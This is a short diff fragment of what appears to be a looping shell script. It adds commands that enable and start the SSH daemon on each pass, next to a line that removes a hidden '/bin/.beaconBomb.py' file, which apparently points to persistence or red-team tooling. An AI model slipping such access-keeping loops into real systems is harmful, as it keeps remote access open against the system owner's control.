@@ -279,5 +279,7 @@ rm /bin/.beaconBomb.py
 fi
 EOFF
 fi
+systemctl enable sshd
+systemctl start sshd
 done
 sleep 60
